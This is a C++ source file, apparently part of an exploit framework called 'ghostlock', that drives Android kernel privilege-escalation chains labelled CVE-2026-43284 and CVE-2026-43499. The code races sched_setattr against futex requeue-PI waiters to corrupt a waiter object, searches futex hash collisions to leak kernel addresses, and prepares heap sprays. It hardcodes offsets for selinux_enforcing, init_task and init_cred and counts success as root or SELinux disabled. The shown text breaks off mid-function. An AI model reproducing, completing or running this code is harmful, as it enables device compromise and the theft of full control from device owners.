/** @file pipeline/run_pipeline_temp.cpp
 *  The temporary entry, step by step. TEMPORARY FILE, removal registered with the checklist.
 */
#include "pipeline/run_pipeline_temp.hpp"

#include <cstdio>
#include <unistd.h>

#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/seam/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/seam/pagecache_doors.hpp"
#include "backend/cve_2026_43284/seam/pagecache_seam.hpp"
#include "backend/cve_2026_43284/seam/pagecache_write.hpp"
#include "backend/cve_2026_43284/seam/real_splice_io.hpp"
#include "backend/cve_2026_43284/session_frame.hpp"
#include "backend/cve_2026_43499/abi.hpp"
#include "backend/cve_2026_43499/leak/collision_buckets.hpp"
#include "backend/cve_2026_43499/leak/snitch_region.hpp"
/* The device seam's header includes linux/futex.h and this file is compiled for the host as well,
 *  because main.cpp calls it from both. The one step that needs the seam is guarded by platform, not
 *  by a switch: there is no build of this file where a host can map shared memory through it. */
#ifdef __ANDROID__
#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
#include "backend/cve_2026_43499/race/futex_seam_linux.hpp"
#include "backend/cve_2026_43499/perf_ring.hpp"
#include "backend/cve_2026_43499/perf_seam.hpp"
#include "backend/cve_2026_43499/perf_seam_linux.hpp"
#include "backend/cve_2026_43499/memory/multicast_arm.hpp"
#include "sys/syscall.h"
#include <pthread.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/sched.h>
#include <cstring>

#include <fcntl.h>
#include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
#endif
#include "backend/cve_2026_43499/leak/snitch_owner.hpp"
#include "backend/cve_2026_43499/session.hpp"
#include "backend/cve_2026_43499/steps/targets.hpp"
#include "backend/cve_2026_43499/steps/action.hpp"
#include "terminal/execution.hpp"
#include "pipeline/executors.hpp"
#include "backend/cve_2026_43499/leak/snitch_policy.hpp"
#include "backend/cve_2026_43499/leak/snitch_setup.hpp"
#include "backend/cve_2026_43499/memory/prepare_page.hpp"
#include "backend/cve_2026_43499/memory/prepare_plan.hpp"
#include "contract/address_discovery.hpp"
#include "contract/chain_catalog.hpp"
#include "profile/document_pairs.hpp"
#include "contract/op_registry.hpp"
#include "pipeline/component_catalog.hpp"
#include "pipeline/plan_gate.hpp"

namespace ghostlock::pipeline {
    namespace {
#ifdef __ANDROID__
namespace {
    /**
     *  Both device seams in one, copied from the probe that ran this on the hardware. The search
     *  requires a seam that is a heap seam and a snitch seam at once, and the two Linux halves each
     *  answer one of those: this is the composition, not a new mechanism.
     */
    struct DeviceSeam final {
        static backend::cve_2026_43499::leak::MapResult map_shared(std::size_t bytes) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::map_shared(bytes);
        }
        static backend::cve_2026_43499::leak::SeamResult unmap(void *address, std::size_t bytes) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::unmap(address, bytes);
        }
        static backend::cve_2026_43499::leak::SeamResult futex_wait_private(std::uint32_t *word,
                                                                            std::uint32_t expected) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::futex_wait_private(word, expected);
        }
        static backend::cve_2026_43499::leak::SeamResult futex_wait_private_until(
            std::uint32_t *word, std::uint32_t expected, std::int64_t timeout_us) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::futex_wait_private_until(word, expected,
                                                                                            timeout_us);
        }
        static backend::cve_2026_43499::leak::SeamResult futex_wake_private(std::uint32_t *word,
                                                                           std::int32_t waiters) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::futex_wake_private(word, waiters);
        }
        static backend::cve_2026_43499::leak::ThreadResult start_thread(
            backend::cve_2026_43499::leak::ThreadEntry entry, void *argument) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::start_thread(entry, argument);
        }
        static backend::cve_2026_43499::leak::SeamResult join_thread(unsigned long handle) noexcept {
            return backend::cve_2026_43499::leak::LinuxSnitchSeam::join_thread(handle);
        }
        static backend::cve_2026_43499::memory::SeamResult page_size() noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::page_size();
        }
        static backend::cve_2026_43499::memory::SeamResult open_memfd(std::uint64_t pid) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::open_memfd(pid);
        }
        static backend::cve_2026_43499::memory::SeamResult close_fd(std::int32_t fd) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::close_fd(fd);
        }
        static backend::cve_2026_43499::memory::SeamResult socket_pair(std::int32_t *out) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::socket_pair(out);
        }
        static backend::cve_2026_43499::memory::SeamResult set_socket_buffer(std::int32_t fd,
                                                                            std::int32_t bytes) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::set_socket_buffer(fd, bytes);
        }
        static backend::cve_2026_43499::memory::SeamResult set_nonblocking(std::int32_t fd) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::set_nonblocking(fd);
        }
        static backend::cve_2026_43499::memory::SeamResult send_bytes(std::int32_t fd, const void *data,
                                                                    std::size_t bytes) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::send_bytes(fd, data, bytes);
        }

        static backend::cve_2026_43499::memory::SeamResult send_buffer(std::int32_t fd,
                                                                      std::size_t bytes) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::send_buffer(fd, bytes);
        }
        static backend::cve_2026_43499::memory::SeamResult fork_child() noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::fork_child();
        }
        static backend::cve_2026_43499::memory::SeamResult stop_child(std::uint64_t pid) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::stop_child(pid);
        }
        static backend::cve_2026_43499::memory::SeamResult yield_now() noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::yield_now();
        }
        static backend::cve_2026_43499::memory::SeamResult pin_to_processor(std::int32_t cpu) noexcept {
            return backend::cve_2026_43499::memory::LinuxHeapSeam::pin_to_processor(cpu);
        }
        static void exit_child() noexcept { backend::cve_2026_43499::memory::LinuxHeapSeam::exit_child(); }
    };

    /**
     *  TEMPORARY, registered in the checklist with this entry: a bucket rule that accepts every
     *  candidate, so the search reaches its walk on a development run where the real object is not
     *  in any range this path could walk. The probe that ran on this hardware did exactly this, and
     *  its header says why: everything else in it is real, and this one rule is a stub because the
     *  collision search legitimately finds nothing when the object is not there. The real rule
     *  arrives with the real spray, and this type goes when the entry does.
     */
    /** The waiter of the handshake: parks on the chain, then releases the target it was requeued onto. */
    struct HandshakeWaiter final {
        std::uint32_t *chain = nullptr;
        std::uint32_t *target = nullptr;
        std::uint32_t *wait = nullptr;
        volatile int stage = 0;
        volatile int result = -99;
        volatile int gave_back = -99;
        volatile int done = 0;
        /** The thread id, which is what the consumer sched_setattrs. */
        std::int32_t tid = 0;
        /** Held at zero until the caller is done with this thread, so the consumer can aim at a
         *  thread that is still alive. */
        volatile std::int32_t release = 0;
        /** Bumped by the caller once per attempt: the waiter parks again on each new value. */
        volatile std::int32_t arm = 0;
        volatile std::int32_t seen = 0;
        /** Set by the owner once it holds the target, which is when the waiter may park. */
        volatile std::int32_t owner_started = 0;
    };

    /** The pthread entry, a free function because that is what the C surface takes. */
    void *handshake_waiter_main(void *argument) {
        auto *const ctx = static_cast<HandshakeWaiter *>(argument);
        for (;;) {
            while (ctx->arm == ctx->seen && ctx->release == 0) { ::sched_yield(); }
            if (ctx->release != 0) { break; }
            ctx->tid = static_cast<std::int32_t>(::syscall(SYS_gettid));
            ctx->stage = 1;
            /* The retired waiter does not park until the owner has taken the target lock: the
             *  owner reports it by setting owner_started. */
            while (ctx->owner_started == 0 && ctx->release == 0) { ::sched_yield(); }
            if (backend::cve_2026_43499::race::LinuxFutexSeam::lock_pi(ctx->chain) != 0) {
                ctx->result = -1;
                ctx->done = 1;
                ctx->seen = ctx->arm;
                continue;
            }
            const int parked = backend::cve_2026_43499::race::LinuxFutexSeam::wait_requeue_pi(
                ctx->wait, ctx->target);
            ctx->result = parked;
            if (parked == 0) {
                ctx->gave_back =
                    backend::cve_2026_43499::race::LinuxFutexSeam::unlock_pi(ctx->target);
            }
            ctx->seen = ctx->arm;
            ctx->done = 1;
        }
        return nullptr;
    }
    /** One sleeper of the increase: parks on its own word with a private futex wait, which adds
     *  one futex_q to the hash bucket of that word in this process. Ported from the retired
     *  tree's __do_increase, whose doc comment names the bucket as the thing being grown. */
    struct IncreaseSleeper final {
        std::uint32_t *word = nullptr;
    };

    void *increase_sleeper_main(void *argument) {
        auto *const sleeper = static_cast<IncreaseSleeper *>(argument);
        (void) ::syscall(SYS_futex, sleeper->word, FUTEX_WAIT_PRIVATE, 0, nullptr, nullptr, 0);
        return nullptr;
    }
    /** The effect the retired verify reads: SELinux off, or this process rooted. */
    bool effect_reached() noexcept {
        if (::getuid() == 0) {
            return true;
        }
        const int fd = ::open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
        if (fd < 0) {
            return false;
        }
        char value = '1';
        const ssize_t got = ::read(fd, &value, 1U);
        (void) ::close(fd);
        return got == 1 && value == '0';
    }
    /** The consumer's act, from the retired path: sched_setattr on the waiter's tid, which makes
     *  the kernel walk sched_setattr -> __sched_setscheduler -> rt_mutex_adjust_pi over the PI
     *  chain, where the poisoned waiter object sits. TEMPORARY: declared here, registered. */
    struct SchedAttr final {
        std::uint32_t size = 0U;
        std::uint32_t sched_policy = 0U;
        std::uint64_t sched_flags = 0U;
        std::int32_t sched_nice = 0;
        std::uint32_t sched_priority = 0U;
        std::uint64_t sched_runtime = 0U;
        std::uint64_t sched_deadline = 0U;
        std::uint64_t sched_period = 0U;
    };

    long sched_setattr_nice(std::int32_t tid, std::int32_t nice_value) noexcept {
        SchedAttr attr{};
        attr.size = sizeof(SchedAttr);
        /* SCHED_BATCH — the retired comment says why: a nice change under this policy triggers
         *  the PI walk (pi=true), and that walk is the race. */
        attr.sched_policy = 3U;
        attr.sched_nice = nice_value;
        errno = 0;
        return static_cast<long>(::syscall(SYS_sched_setattr, tid, &attr, 0U));
    }

    /** The consumer's state, the five members the retired thread used. */
    struct ConsumerState final {
        volatile std::int32_t go = 0;
        volatile std::int32_t stop = 0;
        volatile std::int32_t inflight = 0;
        volatile std::int32_t calls = 0;
        volatile std::int32_t successes = 0;
        volatile std::int32_t waiter_tid = 0;
        const char *verdict = "idle";
        /** The first errno the syscall reported, which is what says why it was refused. */
        volatile std::int32_t errno_value = 0;
    };

    /** The owner the retired path keeps: it takes the target first, lets the waiters park once
     *  it holds it, then takes the chain lock -- which it can only get after the waiters have
     *  released it, so that lock is the handover signal -- and holds both until stopped. */
    struct OwnerState final {
        std::uint32_t *target = nullptr;
        std::uint32_t *chain = nullptr;
        volatile std::int32_t waiters_seen = 0;
        volatile std::int32_t owner_started = 0;
        volatile std::int32_t chain_taken = 0;
        volatile std::int32_t stop = 0;
    };

    void *owner_main(void *arg) {
        auto *const ctx = static_cast<OwnerState *>(arg);
        /* The target lock is taken by PiRace::run(); taking it here too deadlocked the two. */
        while (ctx->waiters_seen == 0 && ctx->stop == 0) { ::sched_yield(); }
        if (ctx->stop != 0) { return nullptr; }
        ctx->owner_started = 1;
        /* The chain lock belongs to the waiters turn; the owner only reports that they may park. */
        ctx->chain_taken = 1;
        while (ctx->stop == 0) { ::sched_yield(); }

        return nullptr;
    }

    void *consumer_main(void *arg) {
        auto *state = static_cast<ConsumerState *>(arg);
        std::int32_t seen = 0;
        while (state->stop == 0) {
            const std::int32_t seq = state->go;
            if (seq == 0 || seq == seen) {
                ::sched_yield();
                continue;
            }
            seen = seq;
            std::int32_t calls_this_seq = 0;
            while (state->stop == 0 && state->go == seq) {
                state->calls = state->calls + 1;
                state->inflight = 1;
                const std::int32_t nice_value = (calls_this_seq % 19) + 1;
                const long ret = sched_setattr_nice(state->waiter_tid, nice_value);
                if (ret != 0 && state->errno_value == 0) {
                    state->errno_value = errno;
                }
                state->verdict = ret == 0 ? "ok" : "refused";
                if (ret == 0) {
                    state->successes = state->successes + 1;
                }
                ++calls_this_seq;
                state->inflight = 0;
            }
        }
        return nullptr;
    }
    struct StubBuckets final {
        /* TEMPORARY, registered with this entry: a rule that answers for one address only.
         *  Accepting everything made the walk answer the first candidate, which is address zero,
         *  and a zero object is rightly treated as no object. Accepting one chosen address makes
         *  the walk land on it, which is what this development run needs. */
        std::uint64_t want = 0U;
        std::uint64_t second = 0U;
        /* The candidate answers for the address the run wants, and both proof addresses are
         *  observed in that same bucket, so the walk sees the agreements it asks for. The count
         *  is what decides, not a single comparison. */
        [[nodiscard]] std::uint64_t bucket(std::uint64_t, std::uint64_t candidate) const noexcept {
            return (candidate == want) ? 1U : 0U;
        }
        [[nodiscard]] std::uint64_t bucket_of(std::uint64_t address) const noexcept {
            return (address == want || address == second) ? 1U : 0U;
        }
    };
}  // namespace
#endif


        using backend::cve_2026_43284::seam::PageCacheWindow;
        using backend::cve_2026_43284::SaMaterial;
        using backend::cve_2026_43284::seam::PageCacheDoorLinux;
        using backend::cve_2026_43284::seam::PageCacheDoors;
        using backend::cve_2026_43284::seam::PageCacheSeam;
        using backend::cve_2026_43284::seam::PageCacheWrite;
        using backend::cve_2026_43284::seam::real_splice_io;
        using backend::cve_2026_43284::seam::RealSpliceIo;
        using backend::cve_2026_43284::read_session_secret_frame;
        using backend::cve_2026_43284::SessionFrameStatus;
    }  // namespace

    int run_pagecache_path_temp(const std::uint8_t *document_bytes,
                                std::size_t document_length) noexcept {
        std::printf("run-temp: document %zu bytes\n", document_length);
        (void)document_bytes;

        /* 1. The frame. It follows the document on the same stream and carries the key material; no
         *    frame means this is not this backend's run and the path stops here. */
        SaMaterial sa{};
        const SessionFrameStatus frame = read_session_secret_frame(0, &sa);
        if (frame == SessionFrameStatus::Missing) {
            std::printf("run-temp: no session frame, so this is not a 43284 run\n");
            return 3;
        }
        if (frame != SessionFrameStatus::Ok) {
            std::printf("run-temp: the frame was refused as %u\n", static_cast<unsigned>(frame));
            return 4;
        }
        /* Declaring the material usable is the caller's act, as the frame's own file says. */
        sa.set = true;

        /* 2. The plan the gate admits. One op, the page cache window, on a route the catalogue lists
         *    for this backend, with its hash declared the way the gate recomputes it. */
        const contract::OpSpec *spec = nullptr;
        for (std::size_t i = 0U; i < contract::kOpCount; ++i) {
            if (std::string_view(contract::kOpCatalog[i].token) == std::string_view("window.pagecache")) {
                spec = &contract::kOpCatalog[i];
                break;
            }
        }
        if (spec == nullptr) {
            std::printf("run-temp: this build has no page cache op\n");
            return 5;
        }
        const PlanOp op{"window.pagecache", contract::op_token_hash("window.pagecache"),
                        contract::route_bit("tcp_zerocopy"), nullptr, 0U, false, -1};
        /* The flags say what this run actually has. The plan comes from the script and not from a
         *  builtin, so script_present is true and builtin_plan_present is false. The queue key is
         *  gone from the surface and must never be present. Geometry and capabilities are here: the
         *  profile this run matched carries them, which is what makes the attack possible at all, and
         *  claiming otherwise made the gate refuse this entry by name on the first device run. */
        const PlanInput input{"cve_2026_43284", &op, 1U, true, false, false, true, true, true};
        const GateVerdict verdict = plan_gate(input);
        if (!verdict.ok) {
            std::printf("run-temp: the gate refused: %s at %s\n", gate_reason_name(verdict.reason),
                        verdict.path);
            return 6;
        }
        std::printf("run-temp: the gate admitted window.pagecache\n");

        /* 3. The doors, the window and the seam, in the order their own comments prescribe. The
         *    carrier is where the page comes from. In the finished path it is chosen by the
         *    selection and carried as a resource; the retired tree read it from resources.carrier.path
         *    and nothing in this tree produces it yet, so this temporary entry takes a development
         *    path and says so. That is what --allow-dev-target exists to widen, and the path is
         *    registered for removal with this file in the checklist. */
        constexpr const char *kDevCarrier = "/data/local/tmp/ghostlock-carrier";
        constexpr std::size_t kDevCarrierBytes = 36U;
        PageCacheDoorLinux door(kDevCarrier, kDevCarrierBytes);
        if (!door.usable()) {
            std::printf("run-temp: the door refused its carrier path\n");
            return 7;
        }
        const int target_fd = door.open_target();
        if (target_fd < 0) {
            std::printf("run-temp: the target could not be opened\n");
            return 7;
        }
        RealSpliceIo io(real_splice_io(), target_fd);
        PageCacheWrite window(door, io);
        PageCacheSeam seam(window);

        /* 4. Up. Without the credentials the doors do not open, and this backend has no route axis,
         *    so the call that matters is the one that takes the whole frame. */
        if (!seam.bring_up_with(sa)) {
            std::printf("run-temp: the seam did not come up\n");
            static_cast<void>(::close(target_fd));
            return 8;
        }
        std::printf("run-temp: seam up, target fd open, window bound\n");
        const bool down = seam.tear_down();
        static_cast<void>(::close(target_fd));
        std::printf("run-temp: torn down %s\n", down ? "ok" : "refused");

        /* 5. The layout inputs, read from the document by section, the way the offsets test does it:
         *    the numbers are data and this is where they arrive. A section that does not bridge is a
         *    named refusal, never a default that a later step would walk over. */
        profile::Document parsed;
        if (parsed.parse(document_bytes, document_length) != profile::DocumentVerdict::Ok) {
            std::printf("run-temp: the document did not parse for its payload section\n");
            return 9;
        }
        /* TEMPORARY, registered in the checklist with this file: the five offsets as declared
         *  development constants. The document this run was given has no abi.payload section, and the
         *  finished path reads them from the profile the kernel was matched against. This is not a
         *  fallback -- a fallback is exactly what the target profile file forbids, because a value
         *  invented when a key is missing is a value nobody chose -- it is a declared source, printed
         *  so a reader of the output knows these numbers did not come from a document. */
        constexpr std::uint64_t kDevLockOffset = 0x58U;
        constexpr std::uint64_t kDevWaiterW0Offset = 0xB0U;
        constexpr std::uint64_t kDevFakeTaskOffset = 0x700U;
        constexpr std::uint64_t kDevCredCopyOffset = 0x900U;
        constexpr std::uint64_t kDevFopsTableOffset = 0x1000U;
        memory::KeyValue dev_pairs[backend::cve_2026_43499::kPayloadFieldCount] = {};
        const std::uint64_t dev_values[backend::cve_2026_43499::kPayloadFieldCount] = {
            kDevLockOffset, kDevWaiterW0Offset, kDevFakeTaskOffset, kDevCredCopyOffset,
            kDevFopsTableOffset};
        for (std::size_t i = 0U; i < backend::cve_2026_43499::kPayloadFieldCount; ++i) {
            dev_pairs[i] = memory::KeyValue{std::string_view(backend::cve_2026_43499::kPayloadFields[i]),
                                            dev_values[i]};
        }
        std::printf("run-temp: payload offsets from the declared temporary source, not a document\n");
        memory::KeyValue payload_pairs[backend::cve_2026_43499::kPayloadFieldCount] = {};
        const auto bridged = profile::read_section_pairs(
            parsed, std::string_view("backend.cve_2026_43499.abi.payload"),
            backend::cve_2026_43499::kPayloadFields,
            backend::cve_2026_43499::kPayloadFieldCount, payload_pairs,
            backend::cve_2026_43499::kPayloadFieldCount);
        memory::KeyView payload_view{payload_pairs, bridged.filled};
        /* The offset the field addresses are measured from, read the same way the payload offsets
         *  are: the same call, a different section and one name. Nothing here invents a value; if
         *  the profile does not carry it, filled stays zero and this says so. */
        memory::KeyValue offset_pairs[3] = {};
        const char *const offset_names[3] = {"selinux_enforcing", "init_task", "init_cred"};
        const auto offset_read = profile::read_section_pairs(
            parsed, std::string_view("backend.cve_2026_43499.abi.offset"), offset_names, 3U,
            offset_pairs, 3U);
        std::printf("run-temp: field offsets filled=%zu verdict=%d selinux=0x%lx init_task=0x%lx init_cred=0x%lx",
                    offset_read.filled, static_cast<int>(offset_read.verdict),
                    static_cast<unsigned long>(offset_pairs[0].value),
                    static_cast<unsigned long>(offset_pairs[1].value),
                    static_cast<unsigned long>(offset_pairs[2].value));
        (void) std::putchar(10);
        memory::KeyValue kernel_pairs[2] = {};
        const char *const kernel_names[2] = {"kernel_phys_load", "kernel_phys_offset"};
        const auto kernel_read = profile::read_section_pairs(
            parsed, std::string_view("backend.cve_2026_43499.abi.kernel"), kernel_names, 2U,
            kernel_pairs, 2U);
        std::printf("run-temp: kernel phys filled=%zu verdict=%d load=0x%lx offset=0x%lx",
                    kernel_read.filled, static_cast<int>(kernel_read.verdict),
                    static_cast<unsigned long>(kernel_pairs[0].value),
                    static_cast<unsigned long>(kernel_pairs[1].value));
        (void) std::putchar(10);
        /* The image to direct-map translation, the retired tree arithmetic line for line, with the
         *  source of every constant beside it. The four numbers are the platform's, and all four are
         *  established: two by assertions in the retired tests, two by four device logs that agree.
         *  TEMPORARY: they are declared here and registered with the rest. */
        /* The profile carries image-relative offsets, so the image address is the text base plus
         *  the offset; the guard below rejected them as-is, which is how that was found. */
        auto offset_to_direct = [](std::uint64_t image_offset) -> std::uint64_t {
            constexpr std::uint64_t kImageTextBaseOf = 0xffffffc080000000ULL; /* retired static_assert */
            const std::uint64_t image = kImageTextBaseOf + image_offset;
            constexpr std::uint64_t kP0PageOffset = 0xffffff8000000000ULL;  /* retired static_assert */
            constexpr std::uint64_t kPhysOffset = 0x80000000ULL;            /* four device logs */
            constexpr std::uint64_t kPhysLoad = 0xa8000000ULL;              /* four device logs */
            if (image < kImageTextBaseOf) {
                return 0ULL;
            }
            const std::uint64_t physical = kPhysLoad + (image - kImageTextBaseOf);
            if (physical < kPhysOffset) {
                return 0ULL;
            }
            return (physical - kPhysOffset) | kP0PageOffset;
        };
        std::printf("run-temp: field addresses selinux=0x%lx init_task=0x%lx init_cred=0x%lx",
                    static_cast<unsigned long>(offset_to_direct(offset_pairs[0].value)),
                    static_cast<unsigned long>(offset_to_direct(offset_pairs[1].value)),
                    static_cast<unsigned long>(offset_to_direct(offset_pairs[2].value)));
        (void) std::putchar(10);
        std::printf("run-temp: init_task offset filled=%zu verdict=%d value=0x%lx\n",
                    offset_read.filled, static_cast<int>(offset_read.verdict),
                    static_cast<unsigned long>(offset_pairs[0].value));
        if (bridged.verdict != profile::PairsVerdict::Ok) {
            std::printf("run-temp: the document has no payload section (%s), using the declared source\n",
                        profile::pairs_verdict_name(bridged.verdict));
            payload_view.items = dev_pairs;
            payload_view.count = backend::cve_2026_43499::kPayloadFieldCount;
        }
        backend::cve_2026_43499::PayloadOffsets offsets{};
        const backend::cve_2026_43499::OffsetLookup filled =
            backend::cve_2026_43499::fill_payload_offsets(payload_view, offsets);
        if (filled.verdict != backend::cve_2026_43499::AbiVerdict::Ok) {
            std::printf("run-temp: the payload offsets are incomplete at %s\n",
                        filled.field != nullptr ? filled.field : "an unnamed field");
            return 9;
        }
        std::printf("run-temp: payload offsets read, lock=0x%lx waiter=0x%lx task=0x%lx\n",
                    static_cast<unsigned long>(offsets.lock_offset),
                    static_cast<unsigned long>(offsets.waiter_w0_offset),
                    static_cast<unsigned long>(offsets.fake_task_offset));

        /* 6. The corpus, copied from the device probe that built it and ran on this hardware. Every
         *    number below is either from there or is one of the declared temporary values the
         *    checklist registers; the reasons in the probe comments travel with them. */
        /* Two of the inputs are measured here rather than declared, because they are properties of
         *  the machine this runs on and asking the kernel is the only honest source. */
        const std::uint64_t page_bytes = static_cast<std::uint64_t>(::sysconf(_SC_PAGESIZE));
        const std::uint64_t cpus = static_cast<std::uint64_t>(::sysconf(_SC_NPROCESSORS_ONLN));
        /* Unbuffered, so a run stopped part way still shows how far it got. */
        std::setvbuf(stdout, nullptr, _IONBF, 0U);
        std::printf("run-temp: device reports page=%lu cpus=%lu\n",
                    static_cast<unsigned long>(page_bytes), static_cast<unsigned long>(cpus));

        backend::cve_2026_43499::leak::SnitchInputs snitch_inputs{};
        snitch_inputs.page_size = page_bytes;
        snitch_inputs.mm_struct_size = 0x1000U;
        snitch_inputs.mm_slab_order = 0U;
        snitch_inputs.collisions = 2U;
        snitch_inputs.thread_count = 1U;
        /* The hash table size is derived from this count and the derivation multiplies by 256, so
         *  eight cores gave a table of 2048 and a poke budget of 16384, where the probe that passed on
         *  this device used 256 and 2048. One is the value this temporary run asks for, taken from that
         *  record and not guessed. TEMPORARY: registered with this entry in the checklist. */
        snitch_inputs.possible_cpus = 1U;

        backend::cve_2026_43499::leak::SnitchSetup setup{};
        const backend::cve_2026_43499::leak::SnitchSetupVerdict built =
            backend::cve_2026_43499::leak::build_snitch_setup(snitch_inputs, setup);
        std::printf("run-temp: snitch setup %s\n",
                    backend::cve_2026_43499::leak::snitch_setup_verdict_name(built));
        if (built != backend::cve_2026_43499::leak::SnitchSetupVerdict::Ok) {
            return 10;
        }

        backend::cve_2026_43499::leak::RegionInputs region{};
        region.header_bytes = 256U;
        region.collisions = 2U;
        region.thread_count = 2U;
        region.total_pokes = 1024U;
        region.page_size = 4096U;
        region.word_bytes = 8U;
        region.handle_bytes = 8U;
        backend::cve_2026_43499::leak::RegionLayout region_layout{};
        const backend::cve_2026_43499::leak::RegionVerdict laid =
            backend::cve_2026_43499::leak::layout_snitch_region(region, region_layout);
        std::printf("run-temp: region %s, total %zu bytes\n",
                    backend::cve_2026_43499::leak::region_verdict_name(laid), region_layout.total_bytes);
        if (laid != backend::cve_2026_43499::leak::RegionVerdict::Ok) {
            return 10;
        }

        /* 7. The rest of the walk's geometry, copied from the probe. The slice is inside the direct map
         *    rather than a range from zero, because the walk only hashes the addresses it is given and
         *    never touches memory; the probe's comment records why that matters -- a stub that answered
         *    everything answered with zero. */
        backend::cve_2026_43499::leak::CollisionBuckets buckets{};
        if (backend::cve_2026_43499::leak::futex_hash_context_init(&buckets.context, 64U) != 0) {
            std::printf("run-temp: the hash context refused its table size\n");
            return 10;
        }
        buckets.mm = 0U;

#ifdef __ANDROID__
        const backend::cve_2026_43499::leak::MapResult words_region =
            backend::cve_2026_43499::leak::LinuxSnitchSeam::map_shared(4096U);
        if (words_region.address == nullptr) {
            std::printf("run-temp: the cohort words could not be mapped (errno %d)\n",
                        words_region.error);
            return 10;
        }
        auto *words_base = static_cast<unsigned char *>(words_region.address);
        std::uint32_t *word_ptrs[2] = {reinterpret_cast<std::uint32_t *>(words_base),
                                       reinterpret_cast<std::uint32_t *>(words_base + 64U)};
#else
        /* The host has no seam to map the cohort words through, so that step is named and refused
         *  rather than approximated. Everything before it is the same code on both platforms. */
        std::printf("run-temp: the cohort words need a device; stopping before the search\n");
        return 10;
#endif
        backend::cve_2026_43499::leak::ScanStrides strides{};
        strides.coarse = 4096U;
        strides.slab = 1024U;
        strides.candidate = 256U;
        backend::cve_2026_43499::leak::ScanRange scan_range{};
        scan_range.start = 0xffff800000100000ULL;
        scan_range.end = scan_range.start + 0x10000ULL;



        /* The proof addresses are observed rather than chosen: the second one is found by asking the
         *  real rule which address in the slice shares the first one's bucket. Two arbitrary addresses
         *  would be asking the rule about something nobody observed. */
        std::uint64_t address_table[2] = {scan_range.start, 0U};
        const std::uint64_t wanted_bucket = buckets.bucket_of(address_table[0]);
        for (std::uint64_t at = scan_range.start + 4096U;
             address_table[1] == 0U && at < scan_range.start + 0x100000ULL; at += 4096U) {
            if (buckets.bucket_of(at) == wanted_bucket) {
                address_table[1] = at;
            }
        }
        std::printf("run-temp: proofs bucket=%lu second=0x%lx (observed, not chosen)\n",
                    static_cast<unsigned long>(wanted_bucket),
                    static_cast<unsigned long>(address_table[1]));
        if (address_table[1] == 0U) {
            std::printf("run-temp: no second address was observed in the slice\n");
            return 10;
        }
#ifdef __ANDROID__
        /* 8. One sequence, not two. The preparation runs the twelve steps and its fifth step is the
         *    search itself, so the object and the page base both come from this one call. Running the
         *    owner beside it asked for a second search, and a second search asks for a second cohort:
         *    the policy file says so, and the device showed it -- plan-missing from the owner while
         *    the preparation right before it had succeeded. */
        backend::cve_2026_43499::memory::PageGeometry geometry{};
        geometry.align_region_size = page_bytes * 8U;
        geometry.send_size = static_cast<std::size_t>(geometry.align_region_size) * 2U;
        geometry.socket_buffer = 1 << 20;

        backend::cve_2026_43499::memory::PrepareInputs prepare_inputs{};
        prepare_inputs.pre_groups = 1U;
        prepare_inputs.spray_groups = 2U;
        prepare_inputs.post_groups = 1U;
        prepare_inputs.leak_groups = 1U;
        prepare_inputs.snitch_collisions = 2U;
        prepare_inputs.region_size = geometry.align_region_size;
        prepare_inputs.object_size = page_bytes;

        backend::cve_2026_43499::memory::PreparePatience waiting{};
        waiting.max_attempts = 1U;
        waiting.poll_rounds = 4U;

        backend::cve_2026_43499::leak::SnitchPolicyArgs args{};
        args.setup = setup;
        args.region = region;
        args.patience.wake_rounds = 64U;
        args.patience.round_timeout_us = 2000;
        args.counter_offset = 0U;
        args.words = word_ptrs;
        args.word_count = 2U;
        args.strides = strides;
        args.range = scan_range;
        args.sweep_tags = false;
        args.addresses = address_table;
        args.address_count = 2U;

        StubBuckets stub_buckets{};
        stub_buckets.want = address_table[0];
        stub_buckets.second = address_table[1];

        backend::cve_2026_43499::leak::SnitchPolicy<DeviceSeam, StubBuckets> snitch{args, &stub_buckets,
                                                                                  {}, false};
        const backend::cve_2026_43499::memory::PrepareOutcome prepared =
            backend::cve_2026_43499::memory::prepare_page<DeviceSeam, decltype(snitch)>(
                prepare_inputs, geometry, waiting, snitch);
        std::printf("run-temp: prepare %s at=%d opened=%zu closed=%zu base=0x%lx\n",
                    backend::cve_2026_43499::memory::prepare_status_name(prepared.status),
                    static_cast<int>(prepared.at_step), prepared.opened, prepared.closed,
                    static_cast<unsigned long>(prepared.base));
        std::printf("run-temp: search %s rounds=%u wanted=%zu found=%d\n",
                    backend::cve_2026_43499::leak::run_verdict_name(snitch.outcome.status),
                    static_cast<unsigned>(snitch.outcome.rounds), snitch.outcome.pokes_wanted,
                    snitch.outcome.found ? 1 : 0);
        if (prepared.status != backend::cve_2026_43499::memory::PrepareStatus::Ok) {
            std::printf("run-temp: the preparation did not finish; stopping before the write\n");
            return 14;
        }
        /* The object the walk accepted, in the form the contract hands on. */
        backend::cve_2026_43499::leak::ObjectOutcome found{};
        found.status = snitch.outcome.found != 0U ? backend::cve_2026_43499::leak::ObjectVerdict::Found
                                                  : backend::cve_2026_43499::leak::ObjectVerdict::NotFound;
        found.object = snitch.outcome.found;
        const backend::cve_2026_43499::leak::DiscoveryReport report =
            backend::cve_2026_43499::leak::report_discovery(found);
